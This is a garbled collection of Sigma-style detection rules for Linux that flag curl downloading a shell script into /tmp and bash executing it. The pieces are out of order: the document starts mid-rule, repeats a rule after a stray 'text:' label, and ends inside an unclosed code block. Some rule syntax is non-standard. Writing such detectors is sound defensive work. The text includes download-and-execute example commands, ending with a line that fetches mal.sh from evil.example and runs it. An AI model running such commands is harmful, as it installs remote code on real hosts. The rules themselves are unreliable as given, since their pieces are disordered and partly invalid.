      - '--output '
      - '-o"'
      - '-o\''

  # Step 2: bash or sh executes a script located in /tmp
  selection_bash_execute:
    Image|endswith:
      - '/bash'
      - '/sh'
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'

  # Direct parent/child variant:
  # curl or wrapper process launches bash executing /tmp script
  selection_parent_child:
    ParentImage|endswith:
      - '/curl'
    Image|endswith:
      - '/bash'
      - '/sh'
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'

  # Single-event wrapper variant:
  # bash -c "curl -o /tmp/file.sh http://host/file.sh && bash /tmp/file.sh"
  selection_compound_command:
    Image|endswith:
      - '/bash'
      - '/sh'
    CommandLine|contains|all:
      - 'curl'
      - '-o'
      - '/tmp/'
      - '.sh'
    CommandLine|contains:
      - '&&'
      - ';'

  condition: >
    (
      selection_curl_download | near selection_bash_execute by Hostname, User by timeframe 5m
    )
    or selection_parent_child
    or selection_compound_command

falsepositives:
  - Legitimate software installers
  - CI/CD pipeline scripts
  - Docker container entrypoints
  - Developer deployment scripts
  - Package manager hooks

level: high

tuning_recommendations:
  - Correlate both process steps using the extracted script path, for example:
      /tmp/[^\\s"']+\\.sh
  - Add allowlist exceptions for known vendors, installer paths, or approved `/tmp` scripts.
  - Consider expanding `/tmp` to `/tmp/`, `/var/tmp/`, and `/dev/shm/` in your environment.
  - Consider adding `wget` variants if your environment uses both `curl` and `wget`.
```

---

## True Temporal Correlation Variant

If your SIEM or detection engine supports native temporal correlation, implement the core logic as:

```text
Event 1:
  Process Image = curl
  Command Line contains:
    -o or --output
    /tmp/
    .sh
  Optional: URL or http(s) reference

Event 2:
  Process Image = bash or sh
  Command Line contains:
    /tmp/
    .sh

Relationship:
  Event 1 occurs before Event 2
  Within 5 minutes
  Same host
  Same user context
  Same extracted script path from CommandLine, if available
```

---

## Fallback Single-Event Rule

Some log sources may not support temporal correlation well. In that case, you can detect the pattern directly from a single process-creation event when `bash` spawns a child process or when the full compound command is logged:

```yaml
title: Download-and-Execute curl to /tmp Script via bash Parent/Child or Compound Command
id: 7f2e9a51-55c3-4d49-81e2-1d6a2b1234ab
status: experimental
description: >
  Detects curl downloaded bash scripts executed from /tmp using parent/child
  process relationships or compound command lines.
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059.004/
tags:
  - attack.execution
  - attack.command-and-control
  - attack.t1105
  - attack.t1059.004

logsource:
  product: linux
  service: process_creation

detection:
  selection_parent_child:
    ParentImage|endswith:
      - '/curl'
    Image|endswith:
      - '/bash'
      - '/sh'
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'

  selection_compound_command:
    Image|endswith:
      - '/bash'
      - '/sh'
    CommandLine|contains|all:
      - 'curl'
      - '-o'
      - '/tmp/'
      - '.sh'
    CommandLine|contains:
      - '&&'
      - ';'

  condition: selection_parent_child or selection_compound_command

falsepositives:
  - legitimate installation scripts
  - automation tooling

level: medium-high
```

---

## Notes

- This rule is intentionally conservative because `curl -o /tmp/*.sh` followed by `bash /tmp/*.sh` can be legitimate.
- For higher fidelity, join the two stages using the actual script path.
- To reduce false positives, suppress known software vendors, approved deployment scripts, and expected installer locations.
- To increase coverage, add `/var/tmp/` and `/dev/shm/` as staging directories if your environment permits it.

text:
Below is a portable **Sigma-style temporal/correlation detection rule** for Linux process-creation telemetry. It models the behavior as:

1. `curl` downloads or writes a bash script into `/tmp`, and  
2. `bash`/`sh` subsequently executes a script from `/tmp`.

```yaml
title: Malicious Download-and-Execute via curl to /tmp Followed by bash Execution
id: 7b9e3c16-6f13-46a9-a04f-6f97f318f5e5
status: experimental
description: >
  Detects when curl downloads or writes a bash script into /tmp and bash later
  executes a script located under /tmp. This pattern is commonly associated with
  download-and-execute malware delivery.
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059.004/
author: security-research
date: 2026-06-15
tags:
  - attack.execution
  - attack.command-and-control
  - attack.t1059.004
  - attack.t1105
severity: high
falsepositives:
  - Legitimate patch/install scripts that use /tmp for staged bash scripts
  - CI/CD automation that downloads scripts to /tmp and executes them
  - Admin troubleshooting scripts created in /tmp
logsource:
  category: process_creation
  product: linux
detection:
  selection_curl_download:
    Image|endswith:
      - '/curl'
    # Detects:
    #   curl <url> -o /tmp/file.sh
    #   curl <url> --output /tmp/file.sh
    #   curl --output=/tmp/file.sh <url>
    #   curl <url> > /tmp/file.sh
    #   curl <url> | tee /tmp/file.sh
    CommandLine|re: '(?i)\bcurl\b.*(?:https?://\S+).*(?:-o|--output)(?:\s+|=)(?:/tmp|/var/tmp)/\S+\.sh|(?i)\bcurl\b.*(?:https?://\S+).*(?:>|\|\s*tee)(?:\s*)?(?:/tmp|/var/tmp)/\S+\.sh'

  selection_bash_execution:
    Image|endswith:
      - '/bash'
      - '/sh'
    # Detects:
    #   bash /tmp/file.sh
    #   sh /tmp/file.sh
    CommandLine|re: '(?i)\b(?:bash|sh)\b.*(?:/tmp|/var/tmp)/\S+\.sh'

  condition: selection_curl_download and selection_bash_execution

correlation:
  type: temporal
  condition: selection_curl_download and selection_bash_execution
  timespan: 5m
  groupby:
    - host
```

If your detection platform does not support Sigma temporal correlation natively, you can also implement a simpler single-event rule to catch chained shell commands such as:

```bash
bash -c "curl http://evil.example/mal.sh -o /tmp/mal.sh && bash /tmp/mal.sh"
